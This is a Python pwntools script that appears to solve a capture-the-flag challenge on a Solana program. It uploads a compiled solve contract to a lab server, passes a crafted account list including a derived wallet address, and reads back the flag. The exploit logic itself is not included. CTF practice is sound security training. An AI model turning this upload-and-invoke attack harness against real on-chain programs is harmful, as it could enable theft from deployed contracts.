from os.path import exists

so_file = "award_solve.so"

if not exists(so_file):
    print("Please compile the solve contract first")
    exit(1)

from pwn import args, remote
from solana.publickey import PublicKey
from solana.system_program import SYS_PROGRAM_ID

host = args.HOST or '10.212.25.14'
port = args.PORT or 31337

r = remote(host, port)
solve = open(so_file, 'rb').read()
r.recvuntil(b'program len: ')
r.sendline(str(len(solve)).encode())
r.send(solve)

r.readuntil(b"program pubkey: ")
program_pubkey_str = r.readline(keepends=False).decode()
program_pubkey = PublicKey(program_pubkey_str)

r.readuntil(b"solve pubkey: ")
solve_pubkey_str = r.readline(keepends=False).decode()
solve_pubkey = PublicKey(solve_pubkey_str)

r.readuntil(b"user pubkey: ")
user_pubkey_str = r.readline(keepends=False).decode()
user_pubkey = PublicKey(user_pubkey_str)

print()
print("program: " + program_pubkey_str)
print("solve  : " + solve_pubkey_str)
print("user   : " + user_pubkey_str)
print()

wallet, _ = PublicKey.find_program_address([b'WALLET', bytes(user_pubkey)], program_pubkey)

r.sendline(b'4')
r.sendline(b'x ' +  program_pubkey.to_base58())
r.sendline(b'ws ' + user_pubkey.to_base58())
r.sendline(b'w ' +  wallet.to_base58())
r.sendline(b'x ' + SYS_PROGRAM_ID.to_base58())
r.sendline(b'0')

r.recvuntil(b'has_flag: ')
has_flag = r.readline(keepends=False).decode()
print("wallet has_flag = " + has_flag + "\n")

r.recvuntil(b'flag: ')
print("flag: ")
r.stream()
